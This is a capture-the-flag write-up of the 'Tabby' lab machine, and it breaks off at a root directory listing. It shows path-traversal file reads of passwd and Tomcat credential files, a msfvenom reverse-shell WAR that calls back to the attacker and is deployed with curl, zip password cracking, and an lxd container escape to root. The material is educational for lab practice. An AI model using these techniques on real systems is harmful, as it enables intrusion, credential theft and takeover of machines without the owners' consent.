## HTB > Machines > Tabby

| key | val |
|-------|-----|
|OS |Linux|
|Difficulty |Easy
|Points |20
|Release |20 Jun 2020
|IP |10.10.10.194
---
### User flag
#### Services enumeration
Let’s start by adding *tabby.htb* to our *hosts* file:
```markdown
$ echo "10.10.10.194 tabby.htb" | sudo tee -a /etc/hosts
```

* Nmap discovers 3 open ports, 2 of which related to *http*.
```markdown
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open http Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
### Web enumeration (port 80/tcp)
Browsing the main page shows an email addresse in the *megahosting.htb* domain. Let’s add the virtualhost to our *hosts* file.

Clicking on the “News” item from the menu redirects us to http://megahosting.htb/news.php?file=statement.

---
### Local File Inclusion (LFI)
This URL is vulnerable to Local File Inclusion (LFI) attacks, which allows to read arbitrary files on the server (e.g. http://megahosting.htb/news.php?file=../../../../etc/passwd).

Exploiting this LFI vulnerability, it is possible to read the source code of the vulnerable page (http://megahosting.htb/news.php?file=../news.php):
```php
<?php
$file = $_GET['file'];
$fh = fopen("files/$file","r");
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?>
```
---
### Apache Tomcat Manager (Port 8080/tcp)
Connecting to http://tabby.htb:8080 shows a HTML page with links to different Apache Tomcat resources, including the manager (*/manager/html*). This latest requires an authentication. Pressing “Escape” to avoid the authentication popup window shows a detailed 401 page. This page refers to a *tomcat-users.xml* configuration file.

After some research on the Internet, googling for possible locations of this file, I eventually came up with the following location: */usr/share/tomcat9/etc/tomcat-users.xml*. To read the configuration file, I used the LFI vulnerability found previously:

URL: http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

We can now connect. Unfortunately, we are not allowed to use the GUI:
```markdown
403 Access Denied
You are not authorized to view this page.
```
It means that we will be forced to manually upload an application using *curl.*

---
### Reverse shell
Let’s prepare the reverse shell:
```bash
$ msfvenom -p java/jsp\_shell\_reverse_tcp lhost=10.10.14.142 lport=4444 -f war -o revshell.war
```
According to the Apache Tomcat documentation ([https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy\_A\_New\_Application\_Archive_(WAR)_Remotely](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely "https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely")), here is how we can deploy an application:
```bash
$ curl -u "tomcat:$3cureP4s5w0rd123!"
--upload-file revshell.war
http://tabby.htb:8080/manager/text/deploy?path=/revshell
```

Let’s confirm that our application has been deployed:
```bash
kali@kali:/data/Tabby/files$ curl -u "tomcat:$3cureP4s5w0rd123!" http://tabby.htb:8080/manager/text/list
OK - Listed applications for virtual host \[localhost\]
/:running:0:ROOT
/revshell:running:0:revshell <--------------------------- It is here!
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```
Now, let’s start a reverse shell (*rlwrap nc -nlvp 4444*) and call our malicious application.
```bash
$ curl -u "tomcat:$3cureP4s5w0rd123!" http://tabby.htb:8080/revshell/
```
Our listener got a response and we now have a reverse shell. Unfortunately, we can’t read the user flag and will need to move laterally to *ash*.
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
tomcat@tabby:/var/lib/tomcat9$ ls -la /home
ls -la /home
total 12
drwxr-xr-x 3 root root 4096 Jun 16 13:32 .
drwxr-xr-x 20 root root 4096 May 19 10:28 ..
drwxr-x--- 3 ash ash 4096 Jun 16 13:59 ash
tomcat@tabby:/var/lib/tomcat9$ ls -la /home/ash
ls -la /home/ash
ls: cannot open directory '/home/ash': Permission denied
```
---
### Lateral move
#### Files owned by *ash*
Checking the files owned by *ash* reveals a backup file. Let’s download it.
```bash
tomcat@tabby:/var/lib/tomcat9$ find / -type f -user ash 2>/dev/null
find / -type f -user ash 2>/dev/null
/var/www/html/files/16162020_backup.zip
```
#### Crack zip archive
The backup is password protected, let’s use John to crack the password.
```bash
kali@kali:/data/Tabby/files$ /data/src/john/run/zip2john 16162020_backup.zip > zip.hash
kali@kali:/data/Tabby/files$ /data/src/john/run/john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP \[32/64\])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it (16162020_backup.zip)
1g 0:00:00:01 DONE (2020-09-17 14:43) 0.7462g/s 7730Kp/s 7730Kc/s 7730KC/s adnc153..adilizinha
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Having the password (*admin@it*), we may assume that *ash* has used the same password for the backup as his session’s password.

---
### Read the user flag
Let’s switch to *ash* and get the user flag:
```bash
tomcat@tabby:/var/www/html$ su ash
su ash
Password: admin@it

ash@tabby:/var/www/html$ cd
cd
ash@tabby:~$ ls -la
ls -la
total 28
drwxr-x--- 3 ash ash 4096 Jun 16 13:59 .
drwxr-xr-x 3 root root 4096 Jun 16 13:32 ..
lrwxrwxrwx 1 root root 9 May 21 20:32 .bash_history -> /dev/null
-rw-r----- 1 ash ash 220 Feb 25 2020 .bash_logout
-rw-r----- 1 ash ash 3771 Feb 25 2020 .bashrc
drwx------ 2 ash ash 4096 May 19 11:48 .cache
-rw-r----- 1 ash ash 807 Feb 25 2020 .profile
-rw-r----- 1 ash ash 0 May 19 11:48 .sudo\_as\_admin_successful
-rw-r----- 1 ash ash 33 Sep 17 12:49 user.txt
ash@tabby:~$ cat user.txt
cat user.txt
f7328d5e25be4a817d7d3482b1e551aa
```

---
### Root flag
#### lxd group
Checking the groups *ash* belongs to reveals that he’s member of the *lxd* group:
```bash
ash@tabby:/opt/tomcat$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
#### Alpine image
We can escalate our privileges quite easily using the alpine image. It requires that we build the image on our machine.
```bash
$ git clone https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ su - root

# ./build-alpine
```
If everything went fine, a *.tar.gz file should have been generated (e.g. alpine-v3.12-x86\_64-20200917\_1504.tar.gz). Transfer it to the target and install the image:

```bash
ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200917_1504.tar.gz --alias myimage
<e-v3.12-x86_64-20200917_1504.tar.gz --alias myimage
ash@tabby:~$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| myimage | aa2e216dad95 | no     | alpine v3.12 (20200917_15:04) | x86_64       | CONTAINER | 3.04MB | Sep 17, 2020 at 4:58pm (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
ash@tabby:~$ lxc init myimage tabby -c security.privileged=true
lxc init myimage tabby -c security.privileged=true
Creating tabby
ash@tabby:~$ lxc config device add tabby mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to tabby
ash@tabby:~$ lxc start tabby
lxc start tabby
ash@tabby:~$ lxc exec tabby /bin/sh
lxc exec tabby /bin/sh
~ # cd /mnt/root/root
cd /mnt/root/root
/mnt/root/root # ls -ila
ls -ila
total 40
 262146 drwx------    6 root     root          4096 Jun 16 13:59 .
      2 drwxr-xr-x   20 root     root          4096 May 19 10:28 ..
 276206 lrwxrwxrwx    1 root     root             9 May 21 20:30 .bash_history -> /dev/null
 262164 -rw-r--r--    1 root     root          3106 Dec  5  2019 .bashrc
 400212 drwx------    2 root     root          4096 May 19 22:23 .cache
 794706 drwxr-xr-x    3 root     root          4096 May 19 11:50 .local
 262165 -rw-r--r--    1 root     root           161 Dec  5  2019 .profile
 276414 -rw-r--r--    1 root     root            66 May 21 13:46 .selected_editor
 794584 drwx------    2 root     root          4096 Jun 16 14:00 .ssh
 276913 -rw-r--r--    1 root     root            33 Sep 17 14:41 root.txt
 794661 drwxr-xr-x    3 root     root          4096 May 19 10:41 snap

